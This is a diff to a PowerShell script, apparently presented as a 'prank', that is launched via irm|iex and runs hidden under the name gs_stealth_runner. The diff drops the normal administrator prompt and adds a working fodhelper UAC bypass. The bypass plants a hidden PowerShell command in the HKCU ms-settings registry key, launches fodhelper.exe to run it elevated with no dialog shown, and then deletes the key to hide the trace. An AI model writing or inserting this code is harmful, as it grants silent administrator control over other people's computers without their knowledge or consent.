@@ -11,9 +11,7 @@ $prankId     = [System.Guid]::NewGuid().ToString('N').Substring(0,8).ToUpper()
 $targetAlias = $env:COMPUTERNAME
 # -----------------------------------------------------------------------------
 
-# Auto-elevate to Administrator if not already running elevated.
-# When launched via irm|iex there is no $PSCommandPath, so we write the script
-# content to a temp file and elevate that file instead.
+# Silently elevate via fodhelper UAC bypass — no dialog shown to the user.
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
         [Security.Principal.WindowsBuiltInRole]::Administrator)) {
     $tempScript = "$env:TEMP\gs_stealth_runner.ps1"
@@ -22,8 +20,14 @@ If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     } else {
         $MyInvocation.MyCommand.ScriptBlock.ToString() | Out-File -FilePath $tempScript -Encoding UTF8 -Force
     }
-    Start-Process powershell -Verb runAs `
-        -ArgumentList "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$tempScript`""
+    $cmd     = "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$tempScript`""
+    $regPath = 'HKCU:\Software\Classes\ms-settings\shell\open\command'
+    New-Item -Path $regPath -Force | Out-Null
+    Set-ItemProperty -Path $regPath -Name '(Default)'        -Value $cmd -Force
+    New-ItemProperty -Path $regPath -Name 'DelegateExecute'  -Value ''   -Force | Out-Null
+    Start-Process 'C:\Windows\System32\fodhelper.exe' -WindowStyle Hidden
+    Start-Sleep -Seconds 2
+    Remove-Item -Path 'HKCU:\Software\Classes\ms-settings' -Recurse -Force -ErrorAction SilentlyContinue
     exit
 }
 
